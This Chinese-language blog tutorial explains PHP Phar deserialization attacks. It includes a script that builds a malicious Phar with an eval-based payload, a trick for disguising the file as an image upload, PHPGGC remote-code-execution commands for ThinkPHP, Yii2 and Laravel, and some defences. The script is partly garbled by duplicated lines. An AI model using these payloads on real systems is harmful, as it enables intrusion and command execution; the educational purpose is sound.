#  第88天-Web攻防大揭秘：PHP反序列化漏洞的“隐藏核武器”——Phar深度解析与框架实战  
原创 Сяо Яо
                    Сяо Яо  AlphaNet   2026-03-10 01:54  
  
在 Web 安全的攻防世界里，**PHP 反序列化漏洞**  
始终是一个经典而危险的漏洞类型。许多开发者认为，只要代码里没有出现 unserialize()  
 函数，就不会存在反序列化风险。  
  
  
事实恰恰相反。  
  
  
PHP 内部存在一个特殊机制：当程序通过 phar:// 协议访问 Phar 文件时，系统会自动解析其中的 **metadata（元数据）**，而这个过程会触发 **反序列化操作**。  
  
  
这意味着攻击者在某些情况下**无需调用 unserialize()**，依然可以触发 POP 链并执行恶意代码。  
  
  
这类攻击技术就是今天的主题：  
  
  
**Phar 反序列化攻击。**  
  
  
本文将从三个层面逐步展开：  
  
- Phar 是什么  
- 为什么会产生漏洞  
- 如何进行实际利用  
并结合 **PHPGGC 工具**与主流框架案例进行分析。  
  
  
# 📦 一、Phar是什么？—— PHP的打包文件格式  
  
  
Phar 的全称是 **PHP Archive**。  
  
  
可以把它理解为 **PHP 世界的 JAR 包**。  
  
  
它允许开发者把多个 PHP 文件、资源文件以及脚本打包为一个单独文件，并且 PHP 可以直接执行或访问其中的内容。  
  
  
最特别的地方在于：  
  
  
PHP 支持通过 **phar:// 伪协议**访问压缩包内部资源，而无需解压。  
  
  
示例代码：  
  
  
```

// 示例：访问Phar文件中的资源
include 'phar://my-app.phar/main.php';

$content = file_get_contents('phar://archive.phar/data.txt');

```  
  
  
  
这种机制在软件发布和组件分发中非常方便。  
  
  
但在安全视角下，它也成为了攻击入口。  
  
  
# ⚠️ 二、为什么Phar会触发反序列化？  
  
  
Phar 文件内部结构大致如下：  
  
```
Stub
Manifest
File Contents
Metadata
Signature

```  
  
  
其中最关键的部分是：  
  
  
**Metadata**  
  
  
Phar 允许开发者在 metadata 中存储任意 PHP 数据对象。  
  
  
当 PHP 解析 Phar 文件时，会执行类似操作：  
  
```
unserialize(metadata)

```  
  
  
于是问题出现了。  
  
  
很多 PHP 文件操作函数在解析 phar:// 路径时会自动触发 Phar 解析。  
  
  
例如：  
  
- file_get_contents  
- fopen  
- file_exists  
- is_file  
- copy  
- stat  
举例：  
  
  
```

file_exists("phar://uploads/avatar.jpg");

```  
  
  
  
即使只是检测文件是否存在，PHP 仍然会执行：  
  
1. 解析 Phar 文件  
1. 读取 metadata  
1. 自动反序列化  
如果 metadata 中存放的是恶意对象，那么对象的魔术方法就可能被触发。  
  
  
攻击流程通常如下：  
  
```
上传恶意Phar
↓
伪装为图片
↓
服务器执行文件操作
↓
Phar解析触发
↓
Metadata自动反序列化
↓
POP链执行
↓
命令执行

```  
  
  
攻击者甚至不需要找到 unserialize()。  
  
  
# 🧪 三、构造恶意Phar文件  
  
  
攻击者首先需要生成一个带有恶意 metadata 的 Phar 文件。  
  
  
步骤如下。  
  
  
首先需要关闭 PHP 的只读限制：  
  
```
phar.readonly = Off

```  
  
  
然后编写生成脚本。  
  
  
```

class Flag{
public $code;public function __destruct(){    eval($this->code);}
}
$a = new Flag();
$a->code = "system('cat /flag');";
$phar = new Phar("exp.phar");
$phar->startBuffering();
$phar->setStub("");
$phar->setMetadata($a);
$phar->addFromString("test.txt","test");
$phar->stopBuffering();

public $code;

public function __destruct(){
    eval($this->code);
}

?>

```  
  
  
  
执行脚本后会生成一个文件：  
  
```
exp.phar

```  
  
  
这个 Phar 的 metadata 中包含一个序列化对象。  
  
  
# 🎭 四、绕过文件上传限制  
  
  
现实环境中，服务器通常会禁止上传 .phar 文件。  
  
  
但是 Phar 文件可以通过修改后缀绕过检测。  
  
  
例如：  
  
```
exp.phar → avatar.jpg

```  
  
  
Phar 文件结构允许前缀存在任意内容，因此可以伪造图片头。  
  
  
攻击者上传文件：  
  
```
avatar.jpg

```  
  
  
如果服务器代码中存在如下逻辑：  
  
  
```

file_exists("phar://uploads/avatar.jpg");

```  
  
  
  
此时 metadata 会被自动解析。  
  
  
POP 链也随之触发。  
  
  
# 🧰 五、自动生成POP链：PHPGGC  
  
  
在真实框架环境中，手动构造 POP 链是非常困难的。  
  
  
因此安全研究人员开发了一个工具：  
  
  
**PHPGGC**  
  
  
全称：  
  
```
PHP Generic Gadget Chains

```  
  
  
GitHub 地址：  
  
```
https://github.com/ambionics/phpggc

```  
  
  
它的作用类似 Java 世界里的 **ysoserial**。  
  
  
只需指定框架和执行命令，就可以自动生成反序列化 Payload。  
  
  
# ⚔️ 六、框架实战案例  
  
### ThinkPHP  
  
  
```

./phpggc ThinkPHP/RCE4 system "cat /flag"

```  
  
  
  
### Yii2  
  
  
```

./phpggc Yii2/RCE1 exec "cp /flag /tmp/test"

```  
  
  
  
### Laravel  
  
  
```

./phpggc Laravel/RCE2 system "id"

```  
  
  
  
Laravel 是目前 POP 链最丰富的 PHP 框架之一。  
  
  
许多 CTF 题目都基于它设计。  
  
  
# 🧠 七、Phar攻击完整链  
  
  
真实攻击流程通常如下：  
  
```
生成恶意Phar
↓
修改后缀绕过检测
↓
上传服务器
↓
程序执行文件操作
↓
phar://解析触发
↓
metadata自动反序列化
↓
POP链执行
↓
命令执行

```  
  
  
攻击成立通常只需要两个条件：  
  
1. 允许上传文件  
1. 代码存在文件操作  
因此 Phar 在很多场景都可以被利用，例如：  
  
- 文件上传模块  
- 图片处理组件  
- 日志读取功能  
- 模板加载系统  
- 缓存文件系统  
# 🛡️ 八、防御思路  
  
  
开发者可以从几个角度降低风险。  
  
  
关闭 Phar 写入功能：  
  
```
phar.readonly = On

```  
  
  
禁用 Phar 协议：  
  
```
stream_wrapper_unregister("phar");

```  
  
  
避免在类中使用危险魔术方法：  
  
```
__destruct
__wakeup
__toString

```  
  
  
同时严格校验上传文件类型。  
  
  
# 🧾 总结  
  
  
Phar 反序列化是 PHP 安全研究中非常典型的一类漏洞。  
  
  
它揭示了一个重要事实：  
  
  
**漏洞往往不在显眼的位置，而在系统自动行为里。**  
  
  
本文核心要点：  
  
- Phar 是 PHP 的打包格式  
- metadata 会自动触发反序列化  
- 文件函数可能解析 phar  
- 攻击者可构造恶意 Phar 文件  
- PHPGGC 可以生成 POP 链  
- 可利用于 ThinkPHP、Yii、Laravel 等框架  
理解这种机制之后，再去审计 PHP 项目，你会发现：  
  
  
很多看似普通的文件操作，其实隐藏着极深的攻击面。  
  
  
复杂系统总会产生奇妙的副作用。安全研究，就是发现这些副作用的人类活动之一。  
  
  
